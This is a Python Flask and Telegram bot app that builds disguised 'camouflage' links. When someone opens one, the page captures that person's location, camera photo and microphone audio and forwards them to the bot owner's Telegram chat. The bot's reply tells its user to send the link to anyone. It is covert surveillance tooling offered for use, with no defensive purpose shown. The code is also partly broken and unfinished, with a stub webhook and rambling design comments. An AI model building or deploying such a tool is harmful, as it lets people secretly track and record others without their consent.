import os
import base64
import tempfile
from flask import Flask, request, render_template, jsonify
from telegram import Bot
from telegram.ext import Application, CommandHandler
from database import create_session, get_chat_id

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("Missing BOT_TOKEN environment variable")

bot = Bot(token=BOT_TOKEN)

# ----------------- Telegram Bot -----------------
async def start(update, context):
    chat_id = update.effective_chat.id
    session_id = create_session(chat_id)
    tracking_url = f"https://{request.host}/camouflage?session={session_id}"
    await update.message.reply_text(
        f"✅ Your unique link is ready!\n\n{tracking_url}\n\n"
        "Send this link to anyone. When they open it, their location, photo, and audio will be sent here."
    )

# ----------------- Helper: send file to user -----------------
def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat = content["lat"]
        lon = content["lon"]
        acc = content["acc"]
        bot.send_message(chat_id, f"📍 Location: {lat}, {lon}\nAccuracy: {acc}m")
    elif data_type == "photo":
        # content is base64 string (data:image/jpeg;base64,...)
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
            tmp.write(img_data)
            tmp_path = tmp.name
        with open(tmp_path, "rb") as f:
            bot.send_photo(chat_id, f)
        os.unlink(tmp_path)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as tmp:
            tmp.write(audio_data)
            tmp_path = tmp.name
        with open(tmp_path, "rb") as f:
            bot.send_audio(chat_id, f)
        os.unlink(tmp_path)

# ----------------- Flask Routes -----------------
@app.route('/camouflage', methods=['GET'])
def camouflage_page():
    session_id = request.args.get('session')
    if not session_id or not get_chat_id(session_id):
        return "Invalid or expired link", 404
    return render_template('camouflage.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400

    data = request.get_json()
    path = request.path
    if '/location' in path:
        send_to_telegram(chat_id, "location", data)
    elif '/photo' in path:
        send_to_telegram(chat_id, "photo", data.get("image"))
    elif '/audio' in path:
        send_to_telegram(chat_id, "audio", data.get("audio"))
    return jsonify({"status": "ok"})

# ----------------- Setup Webhook -----------------
async def setup_webhook():
    # Render provides the public URL via RENDER_EXTERNAL_URL or we construct it
    public_url = os.environ.get("RENDER_EXTERNAL_URL")
    if not public_url:
        public_url = f"https://{request.host}"  # fallback
    webhook_url = f"{public_url}/webhook"
    application = Application.builder().token(BOT_TOKEN).build()
    await application.bot.set_webhook(webhook_url)
    return application

# ----------------- Flask endpoint for Telegram webhook -----------------
@app.route('/webhook', methods=['POST'])
async def webhook():
    update = await application.update_queue.put(request.get_data(as_text=True))
    # Actually we need to process the update. Simpler: use python-telegram-bot's webhook handler.
    # But to avoid complexity, we'll run the bot via polling in a separate thread.
    # However Render's free tier doesn't support threads well. Let's use a simpler approach: 
    # Use python-telegram-bot's WebhookServer directly inside flask? That's overkill.
    
    # Alternative: Use polling in a background thread (works on Render's free web service? It may be killed).
    # Better to use two separate services? Not needed.
    
    # Let's do it cleanly: run the bot using WebhookApp from python-telegram-bot inside flask's main.
    # For simplicity, I'll change the structure: use `python-telegram-bot`'s `Application.run_webhook()` in main.
    pass

# Since this becomes messy, let's use a simpler solution: run bot with polling and flask with gunicorn?
# But Render runs only one command. So we must run both in one process.

# Easiest: Run flask and inside it start the bot's polling in a separate thread.
# I'll rewrite the bottom part to do that.

import threading
import asyncio

def run_bot_polling():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    loop.run_until_complete(application.initialize())
    loop.run_until_complete(application.start())
    loop.run_until_complete(application.updater.start_polling())
    loop.run_forever()

# Start bot polling in background when Flask runs
threading.Thread(target=run_bot_polling, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
